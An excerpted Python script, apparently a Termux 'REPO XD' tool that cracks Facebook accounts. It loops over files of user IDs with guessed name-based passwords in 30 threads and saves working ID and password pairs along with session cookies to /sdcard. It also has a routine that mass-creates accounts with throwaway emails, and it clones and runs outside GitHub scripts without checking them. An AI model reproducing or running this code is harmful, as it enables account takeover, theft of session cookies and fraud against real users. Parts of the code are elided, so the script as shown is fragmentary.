...
os.system('xdg-open https://t.me/SUUID')
print('\033[1;32m[\033[1;37m✓\033[1;32m] \033[1;32mPLEASE WAIT...')
print('\033[1;32m[\033[1;37m✓\033[1;32m] \033[1;32mWELLCOM TO REPO XD TOOL...')
os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")

print('\033[1;32m[\033[1;37m✓\033[1;32m] \033[1;37mJoin Telegram Group...')
os.system('xdg-open https://t.me/SUUID')
...
sys.stdout.write('\x1b]2; REPO XD \x07')
logo=(f"""\033[1;37m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
       ...
       ---   ' \/ `   ---
        ...
        ====UU====UU====
            '//||\\`
              ''``
\033[1;37m------------------------------------------------------
\x1b[1;33m[\033[1;37m✔\x1b[1;33m] \033[1;37mGiTHUB  : REPO-XDR
\x1b[1;33m[\033[1;37m✔\x1b[1;33m] \033[1;37mTOOL TYPE : \033[1;32mPAID
\x1b[1;33m[\033[1;37m✔\x1b[1;33m] \033[1;37mVERSION : \033[1;32m1.0
\033[1;37m------------------------------------------------------""")
def linex():
    print('\033[1;37m-----------------------------------------')
def clear():
...
def menu():
            clear()
        #    linex()
            print('\33[37;42m\t Welcome repo  Tool\33[0;m');linex()
            print('\x1b[1;33m[\033[1;37m1\x1b[1;33m] \x1b[1;92mFile cloning ')
            print('\x1b[1;33m[\033[1;37m2\x1b[1;33m] \x1b[1;93mCreate file')
            print('\x1b[1;33m[\033[1;37m3\x1b[1;33m] \033[1;37munblock network ip')
            print('\x1b[1;33m[\033[1;37m4\x1b[1;33m] \033[1;37mMessage the developer')
            print('\x1b[1;33m[\033[1;37m5\x1b[1;33m] \033[1;37mTelegram')
            print('\x1b[1;33m[\033[1;37m0\x1b[1;33m] \033[1;37mEXIT ')
            linex()
            xd=input('\x1b[1;33m[\033[1;37m✔\x1b[1;33m] \033[1;37mChoose ¦ ')
            if xd in ['1','01']:
                clear()
                print('\x1b[1;33m[\033[1;37m✔\x1b[1;33m] \033[1;37mPut file example:  /sdcard/repo.txt  etc..')
                linex()
                file = input('FILE PUT \033[1;96m: ')
                linex()
                try:
                    ...
                    menu()
                clear()
                print('\x1b[1;33m[\033[1;37m+\x1b[1;33m] \033[1;37m All method')
                linex()
                print('\x1b[1;33m[\033[1;37m1\x1b[1;33m] \033[1;37mMethod \033[1;32m[new] ')
                print('\x1b[1;33m[\033[1;37m2\x1b[1;33m] \033[1;37mMethod \033[1;32m[mix] ')
                linex()
                mthd=input('\x1b[1;33m[\033[1;37m+\x1b[1;33m] \033[1;37mChoose : ')
                linex()
                plist = []
                try:
                    ...
                    ps_limit =1
                clear()
                print('\x1b[1;33m[\033[1;37m+\x1b[1;33m] \033[1;37mexp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f'Put password {i+1}: '))
                clear()
                print('\x1b[1;33m[\033[1;37m+\x1b[1;33m] \033[1;37mDo you went show cp account? (y/n): ')
                linex()
                cx=input('\x1b[1;33m[\033[1;37m+\x1b[1;33m] \033[1;37mChoose: ')
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print('\x1b[1;33mTOTAL IDS : \033[1;32m'+total_ids+f' ')
                    print("\x1b[38;5;208mUse flight mode for speed up")
                    linex()
                    for user in fo:
                ...
                exit('There is no such option...')

def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [REPO-XD] %s|\x1b[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [REPO-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/REPO/REPO-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [REPO-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/REPO/REPO-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/REPO/REPO-CP.txt','a').write(ids+'|'+pas+'\n')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/REPO/REPO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/REPO/REPO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [REPO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/REPO/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/REPO/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [REPO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/REPO/REPO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
try:
    ...
    from io import BytesIO
try:import rich
except:os.system('pkg uninstall python;pkg install python -y;pip install rich')
try:import rich
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [REPO-XD] OK:%s \x1b[1;32m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [REPO-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/REPO/XD-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
...
def createip():
	os.system("cd && git clone https://github.com/MrDevilEx/IP.git")
	os.system('cd && cd IP ;python Ip-Mahadi.py')
#####_____END_____#####

#####_____Create-File_____#####
def create():
	os.system("cd && git clone --depth=1 https://github.com/FXD017/EvaRajy")
	os.system('cd && cd EvaRajy ;python FILE.py')
#####_____END_____#####
